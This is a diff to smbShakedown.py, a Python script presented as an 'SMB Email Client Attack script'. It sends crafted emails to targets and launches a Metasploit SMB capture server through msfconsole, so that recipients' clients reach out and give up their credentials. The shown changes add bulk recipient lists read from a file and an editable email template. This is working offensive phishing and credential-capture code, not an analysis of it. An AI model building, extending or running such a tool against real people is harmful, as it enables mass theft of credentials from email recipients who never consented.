@@ -1,10 +1,12 @@
 #/usr/bin/python
 # Description: A simplified SMB Email Client Attack script.
 # Created by: Nick Sanzotta / @beamr
-# Version: smbShakedown.py v 1.0
-import os, smtplib, getpass, readline, socket, time
+# Version: smbShakedown.py v 1.9102016
+import os, sys, smtplib, getpass, readline, socket, time
 import urllib, json
 rcfile = 'smbServ.rc'
+import readline
+readline.parse_and_bind("tab: complete")
 
 def get_external_address():
 	data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
@@ -31,7 +33,6 @@ def smbServ():
 		os.system('msfconsole -q -r smbServ.rc')
 	elif choice in no:
 		print("Ok, remember to setup your SMBCapture Server elsewhere. \n")
-
 	else:
 		sys.stdout.write("Please respond with 'yes' or 'no'")
 
@@ -87,12 +88,22 @@ def main():
 	print('ENTERED:' "%s" % senderAddress + "\n")
 	recipientName = raw_input('Enter recipient(s) name[Client]: ') or 'client'
 	print('ENTERED:' "%s" % recipientName + "\n")
-	rawrcptAddress = raw_input('Enter recipient(s) address[client@company.com]: ')
-	recipientAddress=rawrcptAddress.split(',')
-	print('ENTERED:' "%s" % recipientAddress + "\n")
-
+	try:
+		print('TIP: For multiple addresses, enter a file or seperate with a comma\n'\
+		'EX:/opt/emailAddresses.txt or user1@company.com,user2@company.com')
+		rawrcptAddress = raw_input('Enter recipient addresses[File or individual email(s)]): ')
+		print('ENTERED:' "%s" % rawrcptAddress + "\n")
+		with open(rawrcptAddress, 'r') as f1:
+			x = f1.read()
+		recipientAddress = x.split()
+		print(recipientAddress)
+		print("\n")
+	except IOError:
+		recipientAddress=rawrcptAddress.split(',')
+		print('ENTERED:' "%s" % recipientAddress + "\n")
 
 ### EDIT: Email Message Template Below ###
+### Becareful not to remove the variables {0},{1},{2},{3} and {4} ###
 	message = """From: {0} <{1}>
 To: {2} <{3}>
 MIME-Version: 1.0
